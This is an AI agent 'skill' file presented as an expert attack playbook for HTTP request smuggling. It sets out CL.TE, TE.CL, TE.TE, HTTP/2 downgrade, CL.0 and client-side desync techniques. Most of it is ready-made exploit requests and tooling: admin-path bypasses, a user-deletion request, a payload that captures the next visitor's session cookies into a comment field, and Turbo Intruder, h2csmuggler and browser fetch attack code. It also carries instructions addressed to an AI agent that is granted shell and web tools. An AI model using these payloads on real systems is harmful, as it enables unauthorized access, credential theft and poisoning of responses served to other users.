---
name: request-smuggling
description: HTTP request smuggling — CL.TE/TE.CL/H2.TE/H2.CL variants, detection (timing-based, differential response), exploitation (bypassing front-end controls, capturing credentials, response queue poisoning, web cache poisoning, host header injection via smuggled request), and Turbo Intruder/h2csmuggler tooling.
sources: hack_skills, bug_bounty_reports
allowed-tools: Bash Read Write Edit Glob Grep Agent WebFetch WebSearch
---

# SKILL: HTTP Request Smuggling — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: HTTP request smuggling exploits disagreements between front-end (load balancer/proxy) and back-end servers on where HTTP request bodies end. Modern variants include H2.TE and H2.CL (HTTP/2 downgrade). Base models often miss: (1) the confirmation step before exploitation, (2) H2 variants that bypass TE obfuscation defenses, (3) the response desync attack direction. Always confirm before attempting to poison.

## 0. RELATED ROUTING

- http2-specific-attacks — H2-specific techniques (single-packet race, h2c smuggling, header injection)
- web-cache-deception — combine smuggling with cache poisoning for wider impact
- auth — bypass authentication via smuggled requests

---

## 1. VULNERABILITY TYPES

| Type | Front-End Uses | Back-End Uses | Attack Vector |
|---|---|---|---|
| **CL.TE** | Content-Length | Transfer-Encoding | Smuggle via TE body |
| **TE.CL** | Transfer-Encoding | Content-Length | Smuggle via oversized CL |
| **TE.TE** | Transfer-Encoding | Transfer-Encoding | Obfuscate TE header |
| **H2.TE** | HTTP/2 (no framing) | TE header | Inject TE in H2 headers |
| **H2.CL** | HTTP/2 (no framing) | Content-Length | Inject CL mismatch in H2 |
| **H2.0** | HTTP/2 | HTTP/1 (no length) | CRLF injection in h2 headers |

---

## 2. DETECTION (TIMING-BASED)

### CL.TE Timing Test

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

1
A
X
```

- **CL.TE vulnerable**: back-end waits for more data after `X` → **10+ second delay**
- Not vulnerable: responds normally

### TE.CL Timing Test

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

- **TE.CL vulnerable**: back-end waits for `X` byte from Content-Length → **10+ second delay**

> **Important**: Send these tests with `Connection: close` and disable request grouping in Burp.

---

## 3. CL.TE EXPLOITATION

Front-end uses Content-Length, back-end uses Transfer-Encoding.

### Basic Smuggle Structure

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggled&x=
0

GET /admin HTTP/1.1
Foo: x
```

The back-end sees two requests:
1. `POST /` with body `q=smuggled&x=`
2. `GET /admin HTTP/1.1` (smuggled)

### Bypass Front-End Access Control

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 112
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

x=hello
```

---

## 4. TE.CL EXPLOITATION

Front-end uses Transfer-Encoding, back-end uses Content-Length.

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

> **Note**: The chunk size `87` must equal the exact byte count of the smuggled request.

---

## 5. TE.TE (OBFUSCATION)

Both servers support TE, but one ignores obfuscated variants.

```http
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: [tab]chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

Send the attack as CL.TE or TE.CL depending on which server ignores the obfuscated form.

---

## 6. H2.TE / H2.CL (HTTP/2 DOWNGRADE)

When a front-end accepts HTTP/2 but back-end is HTTP/1.1.

### H2.TE Attack (Inject TE header into H2 request)

```
:method POST
:path /
:authority target.com
content-type application/x-www-form-urlencoded
transfer-encoding chunked

0

GET /admin HTTP/1.1
Host: target.com
Content-Length: 10

smuggled=x
```

**Burp Suite**: Send in HTTP/2, insert `transfer-encoding: chunked` as a custom header in Inspector.

### H2.CL Attack (CL mismatch)

```
:method POST
:path /
:authority target.com
content-length 0

GET /admin HTTP/1.1
Host: target.com
```

---

## 7. CAPTURING OTHER USERS' REQUESTS

```http
POST /comment HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Transfer-Encoding: chunked

0

POST /comment HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 800

comment=
```

The next victim's request is appended to the `comment=` parameter, capturing their session cookies/headers.

---

## 8. RESPONSE QUEUE POISONING (H2)

Cause two responses to be served to the wrong users.

```
Attack via H2.TE:
1. Smuggle a complete GET /admin request inside the body
2. First attacker response: normal 200 OK for POST /comment
3. Second attacker response: admin response (poison)
4. Next victim receives poisoned response meant for admin
```

---

## 9. CONFIRMING VULNERABILITY SAFELY

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 51
Transfer-Encoding: chunked

0

GET /hopefully404 HTTP/1.1
Foo: x
```

If the **next** normal response from anyone returns 404, the smuggle worked without causing harm.

---

## 10. TOOLING

### Burp Suite

```
1. Enable HTTP Request Smuggler extension
2. Smuggler > Scan for smuggling
3. Repeater: set "Duplicate Content-Length" for manual testing
4. Turn off Update Content-Length in HTTP tab
```

### Turbo Intruder (Python)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           pipeline=False)
    
    smuggle = """POST / HTTP/1.1\r
Host: TARGET\r
Content-Length: 83\r
Transfer-Encoding: chunked\r
\r
0\r
\r
GET /admin HTTP/1.1\r
Host: TARGET\r
Content-Length: 10\r
\r
smuggled="""
    
    engine.queue(smuggle, pauseTime=200)

def handleResponse(req, interesting):
    table.add(req)
```

### h2csmuggler

```bash
pip install h2csmuggler

# Scan for h2c upgrade vulnerability:
h2csmuggler --scan-list targets.txt

# Exploit:
h2csmuggler -x https://target.com \
  -d ':method: GET' \
  -d ':path: /admin' \
  -d ':scheme: https' \
  -d ':authority: target.com'
```

---

## 11. EXPLOITATION DECISION TREE

```
Identify entry point (CDN / load balancer / WAF proxy):
│
├── Does proxy support HTTP/2?
│   ├── Yes → Test H2.TE, H2.CL (most likely modern setup)
│   └── No → Test H1 variants (legacy infrastructure)
│
├── CL.TE timing test: 10s delay?
│   └── Yes → Test CL.TE exploitation path
│
├── TE.CL timing test: 10s delay?
│   └── Yes → Test TE.CL exploitation path
│
└── Both respond normally → Try TE.TE obfuscation variants

What to exploit:
├── Can access admin paths from front-end? → Bypass access control
├── Log body endpoint (comments, search)? → Capture other users' requests
├── Cache involved? → Response queue poison or cache poison
└── OAuth callback via HOST header? → Host header injection via smuggled request
```

## From hack-skills: Advanced Request Smuggling Techniques

### Client-Side Desync (Browser Fetch Pipelines)

**Scenario**: browser's `no-cors` fetch sends a request whose body bytes cause the origin to misparse boundaries — no front-proxy needed.

```javascript
// JavaScript PoC (browser + no-cors + credentials)
fetch("https://target.example/vulnerable", {
  method: "POST",
  mode: "no-cors",
  credentials: "include",
  body: "GET /admin HTTP/1.1\r\nHost: target.example\r\n\r\n"
});
```

**When this works**: server supports HTTP/1.1 keep-alive and has a CL/TE ambiguity reachable from browser fetch without a preflight (no custom headers, no JSON content-type). Success shows as side effects on other requests over the same connection.

### TE.TE — All 8 Obfuscation Variants

Both front and back support TE, but differ on which variant they accept as valid chunked:

```http
Transfer-Encoding: xchunked
```
```http
Transfer-Encoding : chunked
```
```http
Transfer-Encoding: chunked
Transfer-Encoding: chunked
```
```http
Transfer-Encoding: x
```
```http
Transfer-Encoding:[TAB]chunked
```
(Replace [TAB] with real `\x09` byte.)
```http
 Transfer-Encoding: chunked
```
(One leading space before header name.)
```http
X: X
Transfer-Encoding: chunked
```
(Prior line value is `X`; lenient parsers may merge lines.)
```http
Transfer-Encoding
: chunked
```
(Field name and colon on separate physical lines; some parsers accept this.)

**Strategy**: for each (front, back) pair, determine which side accepts which variant as `chunked`. Map to equivalent CL.TE or TE.CL attack direction.

### H2 Downgrade — Pseudo-Header Injection

When edge accepts HTTP/2 but origin uses HTTP/1.1, inject TE header or CRLF-encoded request inside H2 header value:

```
Inject into H2 header value:
  header-name: ignored-value\r\n\r\nGET / HTTP/1.1\r\nHost: target
```

If the H2→H1 translation layer writes header values verbatim, the CRLF sequence splits the reconstructed H1 stream at the origin — without any CL/TE header needed. Test: embed `\r\n\r\nGET /admin HTTP/1.1\r\nHost: target` inside a header value via Burp Inspector.

### CL.0 (Connection-Close Desync)

The origin terminates the connection after a 0-byte body is consumed via `Content-Length: 0`, but the front-end buffers the remaining bytes for the next request on the same connection:

```http
POST /keepalive HTTP/1.1
Host: target.example
Content-Length: 0
Connection: keep-alive

GET /admin HTTP/1.1
Host: target.example
```

No chunked encoding required. Works when front-end reuses connections but back-end closes on `Content-Length: 0`.

### Confirm Without Collateral

Safe confirmation probe — smuggle a request to a 404 path:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 51
Transfer-Encoding: chunked

0

GET /hopefully404 HTTP/1.1
Foo: x
```
If the **next** normal request returns 404, the smuggle worked. Never smuggle sensitive paths during confirmation.
